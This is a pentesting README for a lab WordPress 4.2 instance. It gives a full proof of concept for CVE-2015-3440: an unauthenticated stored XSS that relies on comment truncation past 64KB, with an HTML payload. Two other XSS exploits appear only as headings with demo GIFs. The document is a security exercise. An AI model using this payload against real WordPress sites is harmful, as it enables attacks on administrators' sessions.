# WordPress-Pentesting
Each of the following exploits were demonstratred using [WPDistillery](https://github.com/flurinduerst/WPDistillery) with a stock image of Wordpress (version 4.2).


Exploit 1 - Unauthenticated Stored Cross-Site Scripting (XSS)
------
This exploit affects Wordpress versions 4.2 and earlier [(CVE-2015-3440)](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-3440).

Here we take advantage of the fact that there is 64K limit to the size of a comment. When comments are larger than 64K, it gets truncated. This has to do with the size limits of MySQL text.

So our goal will be to post a visible comment that becomes nefarious upon auto-truncation.

#### Proof of Concept:
1. Post a benign comment(s) that gets approved by an admin so that now we can post our malicious comment without needing approval.
2. Post our malicious comment :
```html
<a title='x onmouseover=alert(unescape(/hello%20world/.source)) style=position:absolute;left:0;top:0;width:5000px;height:5000px  AAAAAAAAAAAA...[64 kb]..AAA'></a>
```
3. Wait for an admin to view the page =)

###### Demo:
![](https://raw.githubusercontent.com/notmike/WordPress-Pentesting/master/exploit1-stored_xss/unauthenticated_xss.gif)


Exploit 2 - Authenticated Stored Cross-Site Scripting (XSS)
------


###### Demo:
![](https://raw.githubusercontent.com/notmike/WordPress-Pentesting/master/exploit2-authenticated_xss/authenticated_xss.gif)


Exploit 3 - Authenticated Cross-Site Scripting (XSS) via Media File Metadata
------


###### Demo:
![](https://raw.githubusercontent.com/notmike/WordPress-Pentesting/master/expoloit3-playlist_xss/playlist-shortcode_xss.gif)
